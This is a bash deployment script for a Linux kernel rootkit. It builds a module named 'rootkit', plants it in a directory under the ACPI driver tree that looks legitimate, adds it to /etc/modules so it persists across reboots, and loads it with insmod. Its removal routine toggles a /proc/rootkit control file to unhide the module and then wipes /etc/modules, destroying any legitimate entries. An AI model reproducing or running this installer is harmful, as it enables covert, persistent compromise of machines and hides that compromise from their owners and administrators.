#!/bin/bash

MODULE_NAME="rootkit"
DRIVER="acpi"
KERNEL_VERSION=$(uname -r)
DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/rk_file_$MODULE_NAME"
PWD="$(cd "$(dirname ${BASH_SOURCE[0]})" && pwd)/"

function install_rk() {
    if test -f "/proc/rootkit"; then
        echo "[+] Removing rootkit"
        remove_rk
    fi
    echo "[+] Installing new rootkit"
    make all

    if [ ! -d $DRIVER_DIRECTORY ]; then
        mkdir -p $DRIVER_DIRECTORY
    fi

    cp "$PWD/build/$MODULE_NAME.ko" "$DRIVER_DIRECTORY"
    echo "$MODULE_NAME" >>/etc/modules
    insmod "$DRIVER_DIRECTORY/$MODULE_NAME.ko"
    depmod
}

function remove_rk() {
    rmmod $MODULE_NAME 2>/dev/null || (
        echo 'toggle' >/proc/rootkit
        rmmod $MODULE_NAME
    )
    rm -rf $DRIVER_DIRECTORY
    echo '' >/etc/modules
    depmod
}

case $1 in
install)
    install_rk
    ;;
remove)
    remove_rk
    ;;
esac
